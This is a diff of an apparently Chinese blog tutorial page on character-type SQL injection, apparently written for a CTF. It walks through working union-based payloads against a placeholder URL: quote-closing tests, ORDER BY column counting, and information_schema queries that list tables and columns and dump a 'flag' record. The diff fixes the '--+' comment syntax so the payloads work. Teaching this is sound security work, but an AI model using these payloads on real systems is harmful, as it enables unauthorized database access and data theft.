@@ -23,7 +23,7 @@
 <meta property="og:description" content="确定是否存在字符型sql注入 使用 and ‘1’&#x3D;’1 和 and ‘1’&#x3D;’2来判断：   Url 地址中输入 http:&#x2F;&#x2F;xxx&#x2F;abc.php?id&#x3D; 1’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。   　　Url 地址中继续输入 http:&#x2F;&#x2F;xxx&#x2F;abc.php?id&#x3D; 1’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入  将单引号闭合在url">
 <meta property="og:locale">
 <meta property="article:published_time" content="2021-03-14T07:18:00.000Z">
-<meta property="article:modified_time" content="2021-03-14T13:27:14.277Z">
+<meta property="article:modified_time" content="2021-03-14T13:57:46.862Z">
 <meta property="article:author" content="weizhao">
 <meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
@@ -188,25 +188,25 @@
 </ul>
 <p>　　Url 地址中继续输入 <a target="_blank" rel="noopener" href="http://xxx/abc.php?id=">http://xxx/abc.php?id=</a> 1’ and ‘1’=’2 页面运行错误，则说明此 Sql 注入为字符型注入</p>
 <ul>
-<li>将单引号闭合<br>在url中使用“–+”将单引号闭合：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://XXX/abc.php?id=1&#39;</a> and ‘1’=’1’–+</li>
+<li>将单引号闭合<br>在url中使用“--+”将单引号闭合：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://XXX/abc.php?id=1&#39;</a> and ‘1’=’1’--+</li>
 </ul>
-<p>__ 注意“–”后面要添加+号，sql语句会变为：<br>select *from user where id=’1’ and ‘1’=’1’– ‘__</p>
+<p>__ 注意“--”后面要添加+号，sql语句会变为：<br>select *from user where id=’1’ and ‘1’=’1’-- ‘__</p>
 <ul>
-<li><p>判断当前表的列数：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> order by 1–+<br>利用order by语句判断，当按照第4列排序时页面返回异常，说明当前表为3列。</p>
+<li><p>判断当前表的列数：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> order by 1--+<br>利用order by语句判断，当按照第4列排序时页面返回异常，说明当前表为3列。</p>
 </li>
-<li><p>得到当前的数据库名称：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,database()–+<br>在页面上即可得到当前的数据库名称。</p>
+<li><p>得到当前的数据库名称：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,database()--+<br>在页面上即可得到当前的数据库名称。</p>
 </li>
-<li><p>得到当前数据库包含的数据表：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1–+</p>
-<p>  <strong>此时的sql语句为：</strong><br>select *from user where id=’1’ and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1– ‘</p>
+<li><p>得到当前数据库包含的数据表：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1--+</p>
+<p>  <strong>此时的sql语句为：</strong><br>select *from user where id=’1’ and ‘1’=’2’ union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1-- ‘</p>
 </li>
 </ul>
 <p>得到第一个表的名称，继续使用limit 1,1得到下一个表的名称，一直到页面异常。</p>
 <ul>
-<li><p>得到某个表包含的列及名称：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1–+</p>
-<p>  <strong>此时的sql语句为：</strong><br>  select *from user where id=’1’ and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1– ‘</p>
+<li><p>得到某个表包含的列及名称：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1--+</p>
+<p>  <strong>此时的sql语句为：</strong><br>  select *from user where id=’1’ and ‘1’=’2’ union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=’error_flag’ limit 0,1-- ‘</p>
 <p> 得到error_flag表的第一个列名，继续使用limit 得到表的每一个列名，直到页面异常。</p>
 </li>
-<li><p>根据得到表的列及名称得到表的记录：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,id,flag from error_flag limit 0,1 –+</p>
+<li><p>根据得到表的列及名称得到表的记录：<br><a target="_blank" rel="noopener" href="http://xxx/abc.php?id=1&#39;">http://xxx/abc.php?id=1&#39;</a> and ‘1’=’2’ union select 1,id,flag from error_flag limit 0,1 --+</p>
 </li>
 </ul>
 <p>使用limit依次得到表的每一条记录。</p>
